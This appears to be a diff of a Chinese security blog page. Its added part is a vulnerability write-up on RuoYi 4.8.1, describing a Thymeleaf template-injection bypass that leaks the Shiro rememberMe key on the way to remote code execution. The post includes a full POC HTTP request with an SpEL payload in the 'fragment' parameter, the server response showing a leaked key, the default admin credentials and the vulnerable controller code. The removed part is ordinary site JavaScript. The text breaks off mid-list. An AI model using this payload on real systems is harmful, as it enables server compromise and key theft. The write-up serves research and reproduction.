-            const container = btn.closest('.code-block-container');
-            const isExpanded = container.getAttribute('data-expanded') === 'true';
-            const next = !isExpanded;
-            container.setAttribute('data-expanded', next);
-            container.setAttribute('aria-expanded', next);
-            
-            btn.setAttribute('aria-expanded', String(next));
-        });
-    });
-
-    
-    document.querySelectorAll('.copy-btn').forEach(btn => {
-        btn.addEventListener('click', async (e) => {
-            e.stopPropagation();
-            const container = btn.closest('.code-block-container');
-            const codeEl = container && container.querySelector('code');
-            const code = codeEl ? codeEl.innerText : '';
-            try {
-                if (navigator.clipboard && navigator.clipboard.writeText) {
-                    await navigator.clipboard.writeText(code);
-                } else {
-                    const ta = document.createElement('textarea');
-                    ta.value = code;
-                    document.body.appendChild(ta);
-                    ta.select();
-                    document.execCommand('copy');
-                    ta.remove();
-                }
-                const originalLabel = btn.getAttribute('aria-label') || '';
-                btn.setAttribute('aria-label', '已复制');
-                setTimeout(() => btn.setAttribute('aria-label', originalLabel), 2000);
-            } catch (err) {
-                console.error('Failed to copy!', err);
-            }
-        });
-    });
-});
-</script>
-
-
-
-
-<script>
-(function() {
-    
-    const STOP_TIME = 15000; 
-    const NUMBER_OF_LEAVES = 30; 
-    
-    
-    if (window.innerWidth < 768) return;
-
-    var container = document.createElement('div');
-    container.id = "sakura-container";
-    container.style.position = 'fixed';
-    container.style.top = '0';
-    container.style.left = '0';
-    container.style.width = '100%';
-    container.style.height = '100%';
-    container.style.pointerEvents = 'none'; 
-    container.style.zIndex = '9999';
-    document.body.appendChild(container);
-
-    function createLeaf() {
-        var leaf = document.createElement('div');
-        
-        leaf.style.position = 'absolute';
-        leaf.style.width = (Math.random() * 10 + 10) + 'px'; 
-        leaf.style.height = (Math.random() * 5 + 5) + 'px';
-        leaf.style.background = 'linear-gradient(to bottom right, #ffc0cb, #ffb6c1)';
-        leaf.style.borderRadius = '10px 0'; 
-        leaf.style.opacity = Math.random() * 0.5 + 0.3;
-        leaf.style.top = '-20px';
-        leaf.style.left = Math.random() * 100 + '%';
-        
-        
-        var duration = Math.random() * 5 + 5 + 's'; 
-        var delay = Math.random() * 5 + 's';
-        
-        leaf.style.transition = `top ${duration} linear, transform ${duration} ease-in-out, opacity ${duration}`;
-        container.appendChild(leaf);
-
-        
-        setTimeout(function() {
-            leaf.style.top = '110%'; 
-            leaf.style.transform = `rotate(${Math.random() * 360}deg) translateX(${Math.random() * 100 - 50}px)`;
-            leaf.style.opacity = '0';
-        }, 100);
-
-        
-        setTimeout(function() {
-            leaf.remove();
-        }, parseFloat(duration) * 1000 + 1000);
-    }
-
-    
-    var interval = setInterval(function() {
-        if (document.getElementById('sakura-container')) {
-            createLeaf();
-        }
-    }, 400); 
-
-    
-    setTimeout(function() {
-        clearInterval(interval); 
-        
-        
-        setTimeout(function() {
-            if(container) container.remove();
-            console.log("樱花已落尽。");
-        }, 10000); 
-        
-    }, STOP_TIME);
-
-})();
-</script>
-
-
-
-
-<script>
-(function() {
-    
-    function pt(n, x, y, w, h) {
-        var c = (x/w*100).toFixed(1) + '% ' + (y/h*100).toFixed(1) + '%';
-        return 'polygon(' + Array(n).fill(c).join(', ') + ')';
-    }
-
-    
-    var silk  = 'cubic-bezier(0.22, 1, 0.36, 1)';   
-    var snap  = 'cubic-bezier(0.33, 1, 0.68, 1)';   
-
-    var effects = [
-        
-        function(x, y, r) {
-            return { kf: { clipPath: [
-                'circle(0px at '+x+'px '+y+'px)',
-                'circle('+r+'px at '+x+'px '+y+'px)'
-            ]}, dur: 380, ease: silk };
-        },
-
-        
-        function(x, y, r) {
-            return { kf: { clipPath: [
-                'ellipse(0px 0px at '+x+'px '+y+'px)',
-                'ellipse('+(r*1.2)+'px '+r+'px at '+x+'px '+y+'px)'
-            ]}, dur: 420, ease: silk };
-        },
-
-        
-        function(x, y, r, w, h) {
-            return { kf: { clipPath: [
-                pt(4, x, y, w, h),
-                'polygon(50% -50%, 150% 50%, 50% 150%, -50% 50%)'
-            ]}, dur: 400, ease: silk };
-        },
-
-        
-        function(x, y, r, w, h) {
-            var l = x < w/2, t = y < h/2;
-            var sx = l ? '-5%' : '105%', sy = t ? '-5%' : '105%';
-            var ex = l ? '200%' : '-100%', ey = t ? '200%' : '-100%';
-            return { kf: { clipPath: [
-                'polygon('+sx+' '+sy+', '+sx+' '+sy+', '+sx+' '+sy+', '+sx+' '+sy+')',
-                'polygon('+sx+' '+sy+', '+ex+' '+sy+', '+ex+' '+ey+', '+sx+' '+ey+')'
-            ]}, dur: 400, ease: snap };
-        },
-
-        
-        function(x, y, r) {
-            return { kf: {
-                clipPath: [
-                    'circle(0px at '+x+'px '+y+'px)',
-                    'circle('+r+'px at '+x+'px '+y+'px)'
-                ],
-                transform: ['rotate(0deg)', 'rotate(90deg)']
-            }, dur: 520, ease: silk };
-        },
-
-        
-        function(x, y, r, w, h) {
-            return { kf: { clipPath: [
-                pt(8, x, y, w, h),
-                'polygon(50% -50%, 62% 38%, 150% 50%, 62% 62%, 50% 150%, 38% 62%, -50% 50%, 38% 38%)'
-            ]}, dur: 460, ease: silk };
-        },
-
-        
-        function() {
-            return { kf: { clipPath: [
-                'inset(50% 50% 50% 50% round 50%)',
-                'inset(0% 0% 0% 0% round 0%)'
-            ]}, dur: 400, ease: silk };
-        },
-
-        
-        function(x, y, r, w, h) {
-            return { kf: { clipPath: [
-                pt(8, x, y, w, h),
-                'polygon(-12% 28%, 22% -18%, 62% -8%, 118% 22%, 122% 72%, 78% 118%, 22% 112%, -18% 68%)'
-            ]}, dur: 460, ease: silk };
-        },
-
-        
-        function(x, y, r, w) {
-            var fromL = x < w/2;
-            return { kf: { clipPath: fromL
-                ? ['inset(0% 100% 0% 0%)', 'inset(0% 0% 0% 0%)']
-                : ['inset(0% 0% 0% 100%)', 'inset(0% 0% 0% 0%)']
-            }, dur: 360, ease: snap };
-        },
-
-        
-        function(x, y, r, w, h) {
-            return { kf: { clipPath: [
-                pt(6, x, y, w, h),
-                'polygon(50% -45%, 135% 2%, 135% 98%, 50% 145%, -35% 98%, -35% 2%)'
-            ]}, dur: 420, ease: silk };
-        }
-    ];
-
-    var lastIdx = -1;
-
-    document.addEventListener('click', function(e) {
-        var btn = e.target.closest('#theme-toggle');
-        if (!btn) return;
-        e.stopPropagation();
-
-        var html = document.documentElement;
-        var isDark = html.dataset.theme === 'dark';
-        var newTheme = isDark ? 'light' : 'dark';
-
-        var rect = btn.getBoundingClientRect();
-        var x = rect.left + rect.width / 2;
-        var y = rect.top  + rect.height / 2;
-        var w = window.innerWidth, h = window.innerHeight;
-        var R = Math.hypot(Math.max(x, w - x), Math.max(y, h - y));
-
-        if (!document.startViewTransition ||
-            window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-            html.dataset.theme = newTheme;
-            localStorage.setItem('pref-theme', newTheme);
-            return;
-        }
-
-        var transition = document.startViewTransition(function() {
-            html.dataset.theme = newTheme;
-            localStorage.setItem('pref-theme', newTheme);
-        });
-
-        transition.ready.then(function() {
-            var isNowDark = (newTheme === 'dark');
-
-            
-            var idx;
-            do { idx = Math.floor(Math.random() * effects.length); }
-            while (idx === lastIdx && effects.length > 1);
-            lastIdx = idx;
-
-            var fx = effects[idx](x, y, R, w, h);
-
-            
-            var keyframes = {};
-            Object.keys(fx.kf).forEach(function(prop) {
-                keyframes[prop] = isNowDark ? fx.kf[prop].slice().reverse() : fx.kf[prop];
-            });
-
-            document.documentElement.animate(keyframes, {
-                duration: fx.dur,
-                easing:   fx.ease,
-                fill:     'forwards',
-                pseudoElement: isNowDark
-                    ? '::view-transition-old(root)'
-                    : '::view-transition-new(root)'
-            });
-        });
-    }, true);
-})();
-</script>
-
-
-
-
-<script>
-(function() {
-    var header = document.querySelector('.header');
-    if (!header) return;
-    var progressBar = document.querySelector('.progress-bar');
-    var lastY = window.scrollY;
-    var ticking = false;
-    var threshold = 5;
-
-    function update() {
-        var currentY = window.scrollY;
-        if (currentY <= 10) {
-            header.classList.remove('header-hidden');
-        } else if (currentY > lastY + threshold) {
-            header.classList.add('header-hidden');
-        } else if (currentY < lastY - threshold) {
-            header.classList.remove('header-hidden');
-        }
-        
-        if (progressBar) {
-            progressBar.style.top = header.classList.contains('header-hidden') ? '0' : '';
-        }
-        lastY = currentY;
-        ticking = false;
-    }
-
-    window.addEventListener('scroll', function() {
-        if (!ticking) {
-            window.requestAnimationFrame(update);
-            ticking = true;
-        }
-    }, { passive: true });
-})();
-</script>
-
-
-
-
-<script>
-(function() {
-    var overlay = document.getElementById('lightbox-overlay');
-    if (!overlay) return;
-    var lbImg = overlay.querySelector('.lightbox-img');
-
-    document.querySelectorAll('.post-content img').forEach(function(img) {
-        img.style.cursor = 'zoom-in';
-        img.addEventListener('click', function(e) {
-            e.preventDefault();
-            lbImg.src = this.src;
-            lbImg.alt = this.alt || '';
-            overlay.classList.add('active');
-            overlay.setAttribute('aria-hidden', 'false');
-            document.body.style.overflow = 'hidden';
-        });
-    });
-
-    function closeLightbox() {
-        overlay.classList.remove('active');
-        overlay.setAttribute('aria-hidden', 'true');
-        document.body.style.overflow = '';
-    }
-
-    overlay.addEventListener('click', function(e) {
-        if (e.target !== lbImg) closeLightbox();
-    });
-    overlay.querySelector('.lightbox-close').addEventListener('click', closeLightbox);
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape' && overlay.classList.contains('active')) closeLightbox();
-    });
-})();
-</script>
-
-
-
-
-<script>
-(function() {
-    var observer = new MutationObserver(function(mutations) {
-        mutations.forEach(function(m) {
-            if (m.attributeName === 'data-theme') {
-                var theme = document.documentElement.getAttribute('data-theme') === 'dark'
-                    ? 'dark_protanopia' : 'light_protanopia';
-                var iframe = document.querySelector('iframe.giscus-frame');
-                if (iframe) {
-                    iframe.contentWindow.postMessage(
-                        { giscus: { setConfig: { theme: theme } } },
-                        'https://giscus.app'
-                    );
-                }
-            }
-        });
-    });
-    observer.observe(document.documentElement, { attributes: true, attributeFilter: ['data-theme'] });
-})();
-</script>
-
-
-
-
-<script>
-(function() {
-    var container = document.getElementById('typewriter-content');
-    if (!container) return;
-    var target = container.querySelector('p') || container;
-    var text = target.textContent.trim();
-    if (!text) return;
-
-    target.textContent = '';
-    var cursor = document.createElement('span');
-    cursor.className = 'typewriter-cursor';
-    cursor.innerHTML = '\u00a0';
-    target.appendChild(cursor);
-
-    var i = 0;
-    function type() {
-        if (i < text.length) {
-            target.insertBefore(document.createTextNode(text.charAt(i)), cursor);
-            i++;
-            setTimeout(type, 80);
-        } else {
-            setTimeout(function() { cursor.style.display = 'none'; }, 3000);
-        }
-    }
-    type();
-})();
-</script>
-
-
-
-
-<script>
-(function() {
-    var filterContainer = document.getElementById('searchTagFilter');
-    var chipsContainer = document.getElementById('tagChips');
-    if (!filterContainer || !chipsContainer) return;
-
-    var searchData = null;
-    var activeTag = null;
-
-    var xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-            searchData = JSON.parse(xhr.responseText);
-            renderTagChips();
-        }
-    };
-    xhr.open('GET', '../index.json');
-    xhr.send();
-
-    function renderTagChips() {
-        var tagCounts = {};
-        searchData.forEach(function(item) {
-            (item.tags || []).forEach(function(tag) {
-                tagCounts[tag] = (tagCounts[tag] || 0) + 1;
-            });
-            (item.categories || []).forEach(function(cat) {
-                tagCounts[cat] = (tagCounts[cat] || 0) + 1;
-            });
-        });
-
-        var sorted = Object.keys(tagCounts).sort(function(a, b) {
-            return tagCounts[b] - tagCounts[a];
-        });
-
-        sorted.forEach(function(tag) {
-            var chip = document.createElement('button');
-            chip.className = 'tag-chip';
-            chip.textContent = tag + ' (' + tagCounts[tag] + ')';
-            chip.dataset.tag = tag;
-            chip.addEventListener('click', function() { toggleTag(tag, chip); });
-            chipsContainer.appendChild(chip);
-        });
-
-        filterContainer.style.display = '';
-    }
-
-    function toggleTag(tag, chip) {
-        var resList = document.getElementById('searchResults');
-        if (activeTag === tag) {
-            activeTag = null;
-            chip.classList.remove('active');
-            resList.innerHTML = '';
-            return;
-        }
-
-        chipsContainer.querySelectorAll('.tag-chip').forEach(function(c) {
-            c.classList.remove('active');
-        });
-        activeTag = tag;
-        chip.classList.add('active');
-
-        var results = searchData.filter(function(item) {
-            return (item.tags || []).includes(tag) || (item.categories || []).includes(tag);
-        });
-
-        var html = '';
-        results.forEach(function(item) {
-            html += '<li class="post-entry"><header class="entry-header">' +
-                item.title + '&nbsp;&raquo;</header>' +
-                '<a href="' + item.permalink + '" aria-label="' +
-                item.title.replace(/"/g, '&quot;') + '"></a></li>';
-        });
-        resList.innerHTML = html;
-    }
-
-    
-    var sInput = document.getElementById('searchInput');
-    if (sInput) {
-        sInput.addEventListener('input', function() {
-            if (activeTag) {
-                activeTag = null;
-                chipsContainer.querySelectorAll('.tag-chip').forEach(function(c) {
-                    c.classList.remove('active');
-                });
-            }
-        });
-    }
-})();
-</script>
-
-
-<script>
-    let menu = document.getElementById('menu');
-    if (menu) {
-        
-        const scrollPosition = localStorage.getItem("menu-scroll-position");
-        if (scrollPosition) {
-            menu.scrollLeft = parseInt(scrollPosition, 10);
-        }
-        
-        menu.onscroll = function () {
-            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
-        }
-    }
-
-    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-        anchor.addEventListener("click", function (e) {
-            e.preventDefault();
-            var id = this.getAttribute("href").substr(1);
-            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
-                    behavior: "smooth"
-                });
-            } else {
-                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
-            }
-            if (id === "top") {
-                history.replaceState(null, null, " ");
-            } else {
-                history.pushState(null, null, `#${id}`);
-            }
-        });
-    });
-
-</script>
-<script>
-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
-
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        const html = document.querySelector("html");
-        if (html.dataset.theme === "dark") {
-            html.dataset.theme = 'light';
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            html.dataset.theme = 'dark';
-            localStorage.setItem("pref-theme", 'dark');
-        }
-    })
-
-</script>
-<script>
-    document.querySelectorAll('pre > code').forEach((codeblock) => {
-        const container = codeblock.parentNode.parentNode;
-
-        const copybutton = document.createElement('button');
-        copybutton.classList.add('copy-code');
-        copybutton.innerHTML = 'copy';
-
-        function copyingDone() {
-            copybutton.innerHTML = 'copied!';
-            setTimeout(() => {
-                copybutton.innerHTML = 'copy';
-            }, 2000);
-        }
-
-        copybutton.addEventListener('click', (cb) => {
-            if ('clipboard' in navigator) {
-                navigator.clipboard.writeText(codeblock.textContent);
-                copyingDone();
-                return;
-            }
-
-            const range = document.createRange();
-            range.selectNodeContents(codeblock);
-            const selection = window.getSelection();
-            selection.removeAllRanges();
-            selection.addRange(range);
-            try {
-                document.execCommand('copy');
-                copyingDone();
-            } catch (e) { };
-            selection.removeRange(range);
-        });
-
-        if (container.classList.contains("highlight")) {
-            container.appendChild(copybutton);
-        } else if (container.parentNode.firstChild == container) {
-            
-        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
-            
-            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
-        } else {
-            
-            codeblock.parentNode.appendChild(copybutton);
-        }
-    });
-</script>
-</body>
-
-</html>
+某依最新版本稳定4.8.1 RCE (Thymeleaf模板注入绕过)"><meta name=author content="map[name:xvsf]"><link rel=canonical href=https://xvshifu.github.io/xvsf/posts/%E8%8B%A5%E4%BE%9D4.8.1%E6%BC%8F%E6%B4%9E-ssti%E7%BB%95%E8%BF%87%E8%8E%B7%E5%8F%96shirokey%E8%87%B3rce/><link crossorigin=anonymous href=/xvsf/assets/css/stylesheet.4e4ecb7d4195e82660ea06b686fab82fcc864062b4f7d37044dd74dec0344222.css integrity="sha256-Tk7LfUGV6CZg6ga2hvq4L8yGQGK099NwRN103sA0QiI=" rel="preload stylesheet" as=style><link rel=icon href=https://xvshifu.github.io/xvsf/img/2.jpg><link rel=icon type=image/png sizes=16x16 href=https://xvshifu.github.io/xvsf/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://xvshifu.github.io/xvsf/favicon-32x32.png><link rel=apple-touch-icon href=https://xvshifu.github.io/xvsf/apple-touch-icon.png><link rel=mask-icon href=https://xvshifu.github.io/xvsf/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://xvshifu.github.io/xvsf/posts/%E8%8B%A5%E4%BE%9D4.8.1%E6%BC%8F%E6%B4%9E-ssti%E7%BB%95%E8%BF%87%E8%8E%B7%E5%8F%96shirokey%E8%87%B3rce/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&display=swap"><meta name=view-transition content="same-origin"><div id=lightbox-overlay class=lightbox-overlay aria-hidden=true><button class=lightbox-close aria-label=关闭>&#215;</button>
+<img class=lightbox-img alt></div><div class=progress-bar></div><script>document.addEventListener("DOMContentLoaded",()=>{const t=document.querySelector(".progress-bar"),e=()=>{const e=window.innerHeight,n=document.documentElement.scrollHeight-e,s=window.scrollY,o=s/n*100;t.style.width=`${o}%`};window.addEventListener("scroll",e),e()})</script><meta property="og:url" content="https://xvshifu.github.io/xvsf/posts/%E8%8B%A5%E4%BE%9D4.8.1%E6%BC%8F%E6%B4%9E-ssti%E7%BB%95%E8%BF%87%E8%8E%B7%E5%8F%96shirokey%E8%87%B3rce/"><meta property="og:site_name" content="xvsf"><meta property="og:title" content="若依4.8.1漏洞 SSTI绕过获取ShiroKey至RCE"><meta property="og:description" content="参考文章： 若依最新版本4.8.1漏洞 SSTI绕过获取ShiroKey至RCE(全JAVA版本绕过，附带POC)
+https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
+某依最新版本稳定4.8.1 RCE (Thymeleaf模板注入绕过)"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2026-01-07T10:00:00+08:00"><meta property="article:modified_time" content="2026-01-07T10:00:00+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="若依4.8.1漏洞 SSTI绕过获取ShiroKey至RCE"><meta name=twitter:description content="参考文章：
+若依最新版本4.8.1漏洞 SSTI绕过获取ShiroKey至RCE(全JAVA版本绕过，附带POC)
+https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ
+某依最新版本稳定4.8.1 RCE (Thymeleaf模板注入绕过)"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://xvshifu.github.io/xvsf/posts/"},{"@type":"ListItem","position":2,"name":"若依4.8.1漏洞 SSTI绕过获取ShiroKey至RCE","item":"https://xvshifu.github.io/xvsf/posts/%E8%8B%A5%E4%BE%9D4.8.1%E6%BC%8F%E6%B4%9E-ssti%E7%BB%95%E8%BF%87%E8%8E%B7%E5%8F%96shirokey%E8%87%B3rce/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"若依4.8.1漏洞 SSTI绕过获取ShiroKey至RCE","name":"若依4.8.1漏洞 SSTI绕过获取ShiroKey至RCE","description":"参考文章： 若依最新版本4.8.1漏洞 SSTI绕过获取ShiroKey至RCE(全JAVA版本绕过，附带POC)\nhttps://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ\n某依最新版本稳定4.8.1 RCE (Thymeleaf模板注入绕过)\n","keywords":[],"articleBody":"参考文章： 若依最新版本4.8.1漏洞 SSTI绕过获取ShiroKey至RCE(全JAVA版本绕过，附带POC)\nhttps://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ\n某依最新版本稳定4.8.1 RCE (Thymeleaf模板注入绕过)\nhttps://mp.weixin.qq.com/s/uxvGbO4biM87DVSXA_ZlQw\n环境搭建 源码：\nhttps://github.com/yangzongzhuan/RuoYi/releases\n参考文档：RuoYi-4.8.1\\doc\\若依环境使用手册.docx\n导入数据库\n修改数据库配置：RuoYi-4.8.1\\ruoyi-admin\\src\\main\\resources\\application-druid.yml\n服务器端口：RuoYi-4.8.1\\ruoyi-admin\\src\\main\\resources\\application.yml\n启动若依\n默认密码为 admin/admin123\n漏洞复现 POC：\nhtml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 POST /monitor/cache/getNames HTTP/1.1 Host: 127.0.0.1 Cookie: JSESSIONID=3e7df59c-7b52-4b63-9828-d1a60bcf62e2; rememberMe=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 Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Sec-Fetch-Mode: navigate Accept-Encoding: gzip, deflate, br, zstd sec-ch-ua-mobile: ?0 Accept-Language: zh-CN,zh;q=0.9 sec-ch-ua: \"Not:A-Brand\";v=\"99\", \"Google Chrome\";v=\"145\", \"Chromium\";v=\"145\" sec-ch-ua-platform: \"Windows\" User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Sec-Fetch-Dest: document Upgrade-Insecure-Requests: 1 Referer: http://127.0.0.1/monitor/job Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 fragment=__|$${#response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}|__::.x html\r1 2 3 4 5 6 7 HTTP/1.1 200 Content-Type: text/html; charset=ISO-8859-1 Content-Language: zh-CN Date: Sat, 07 Mar 2026 02:24:08 GMT Content-Length: 25 CEuLWXvwpGKpptw3aVUvQg== shiro 利用\n漏洞分析 漏洞点 RuoYi-4.8.1\\ruoyi-admin\\src\\main\\java\\com\\ruoyi\\web\\controller\\monitor\\CacheController.java\njava\r1 2 3 4 5 6 7 @RequiresPermissions(\"monitor:cache:view\") @PostMapping(\"/getNames\") public String getCacheNames(String fragment, ModelMap mmap) { mmap.put(\"cacheNames\", cacheService.getCacheNames()); return prefix + \"/cache::\" + fragment; } 用户在 http://localhost:80/monitor/cache/getNames 接口处 POST 传入的 fragment 参数，被直接拼接到 Thymeleaf 模板路径中，return返回结果使用 Thymeleaf 片段语法(::)拼接\nThymeleaf片段语法格式为：前缀 + \"/cache::\" + 片段名\njava\r1 return prefix + \"/cache::\" + fragment; 攻击者通过 fragment 参数注入 SpEL 表达式，Thymeleaf 在解析视图名时会自动执行\n通过__|$${表达式}|__::.x 该格式可进行绕过，先来试验一下：\nplain\r1 fragment=__|$${#response.getWriter().print('111')}|__::.x 关于 payload 的构造可以看 https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ 这篇文章，讲解十分详细\n最新版本中禁用的语法：\n❌ T(java.lang.Runtime)（类型引用） ❌ new java.io.File()（对象实例化） ❌ T 